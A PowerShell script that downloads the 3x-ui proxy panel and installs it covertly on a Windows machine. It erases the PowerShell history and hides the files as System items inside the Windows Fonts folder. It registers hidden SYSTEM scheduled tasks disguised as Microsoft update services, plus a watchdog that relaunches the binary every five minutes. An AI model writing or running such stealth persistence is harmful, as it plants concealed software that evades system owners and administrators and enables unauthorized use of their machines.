#Requires -RunAsAdministrator
Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

$downloadDir = Join-Path $env:SystemDrive "Windows\Fonts"
$zipFileName = "x-ui-windows-amd64.zip"
$zipPath = Join-Path $downloadDir $zipFileName
$url = "https://github.com/MHSanaei/3x-ui/releases/latest/download/$zipFileName"
$extractedDirName = "x-ui"
$extractedPath = Join-Path $downloadDir $extractedDirName
$executableName = "x-ui.exe"
$executablePath = Join-Path $downloadDir $executableName
$mainTaskName = "Microsoft Update Service"
$watchdogTaskName = "Microsoft Update Temporary Storage"
$taskPath = "\Microsoft\Windows"

# Stop existing process and remove old tasks
Stop-Process -Name ($executableName.Split('.')[0]) -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $watchdogTaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue

try {
    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "Error downloading file: $_"
    exit 1
}

try {
    Expand-Archive -Path $zipPath -DestinationPath $downloadDir -Force -ErrorAction Stop
    $sourceFiles = Get-ChildItem -Path $extractedPath
    if ($null -ne $sourceFiles) {
        $fileNamesToHide = $sourceFiles.Name
        Move-Item -Path $sourceFiles.FullName -Destination $downloadDir -Force
        
        foreach ($fileName in $fileNamesToHide) {
            $itemToHidePath = Join-Path $downloadDir $fileName
            if (Test-Path $itemToHidePath) {
                try {
                    icacls.exe "$itemToHidePath" /grant "SYSTEM:F" /t /c /q
                    $file = Get-Item -LiteralPath $itemToHidePath -ErrorAction Stop
                    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                } catch {
                    # Silently continue on error, similar to the original script's behavior
                }
            }
        }
    }
    if (Test-Path -Path $extractedPath) {
        Remove-Item -Path $extractedPath -Recurse -Force
    }
} catch {
    Write-Error "Error processing archive: $_"
    if (Test-Path -Path $zipPath) {
        Remove-Item -Path $zipPath -Force
    }
    exit 1
}

if (Test-Path -Path $zipPath) {
    Remove-Item -Path $zipPath -Force
}

try {
    $action = New-ScheduledTaskAction -Execute $executablePath -WorkingDirectory $downloadDir -ErrorAction Stop
    $trigger = New-ScheduledTaskTrigger -AtStartup -ErrorAction Stop
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction Stop
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
} catch {
    Write-Error "Error creating startup task: $_"
    exit 1
}

try {
    $processName = $executableName.Split('.')[0]
    $watchdogCommand = "if (-not (Get-Process -Name '$processName' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$executablePath' -WorkingDirectory '$downloadDir' -WindowStyle Hidden }"
    $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$watchdogCommand`"" -ErrorAction Stop
    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -ErrorAction Stop
    Register-ScheduledTask -TaskName $watchdogTaskName -TaskPath $taskPath -Action $watchdogAction -Trigger $watchdogTrigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
} catch {
    Write-Error "Error creating watchdog task: $_"
    exit 1
}

Start-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath
